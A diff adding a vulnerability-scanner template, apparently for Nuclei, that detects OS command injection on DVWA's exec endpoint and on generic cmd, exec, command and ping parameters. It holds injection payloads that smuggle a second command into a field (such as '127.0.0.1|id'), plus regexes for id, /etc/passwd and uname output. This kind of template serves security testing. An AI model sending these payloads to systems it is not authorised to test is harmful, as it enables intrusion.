@@ -1,0 +1,47 @@
+id: hunt3r-command-injection
+
+info:
+  name: Command Injection Detection
+  author: hunt3r
+  severity: critical
+  description: Detects OS command injection via common parameters. Tests DVWA exec endpoint and generic cmd params.
+  tags: rce,command-injection,hunt3r
+  reference:
+    - https://portswigger.net/web-security/os-command-injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/exec/"
+
+    body: "ip=127.0.0.1|id&Submit=Submit"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "security=low"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\(.*\\)"
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:[0-9]"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/exec/?ip=127.0.0.1|id&Submit=Submit"
+      - "{{BaseURL}}/?cmd=id"
+      - "{{BaseURL}}/?exec=id"
+      - "{{BaseURL}}/?command=id"
+      - "{{BaseURL}}/ping?host=127.0.0.1|id"
+      - "{{BaseURL}}/api/ping?ip=127.0.0.1|id"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\(.*\\)"
+          - "root:[x*]:0:0"
+          - "Linux .* #[0-9]"
